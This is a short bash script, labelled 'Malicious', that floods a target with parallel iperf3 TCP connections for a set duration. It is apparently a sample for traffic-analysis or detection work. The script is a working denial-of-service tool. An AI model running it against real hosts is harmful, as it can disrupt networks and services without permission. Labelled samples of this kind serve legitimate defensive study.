#!/bin/bash
# Malicious: Parallel TCP Flood - spawn multiple TCP connections to the target
# Usage: ./parallel_tcp_flood.sh <server_ip> [port] [duration_sec] [connections]
SERVER=${1:-127.0.0.1}
PORT=${2:-5201}
DURATION=${3:-60}
CONNS=${4:-10}
for i in $(seq 1 "$CONNS"); do
  iperf3 -c "$SERVER" -p "$PORT" -t "$DURATION" &
done
wait
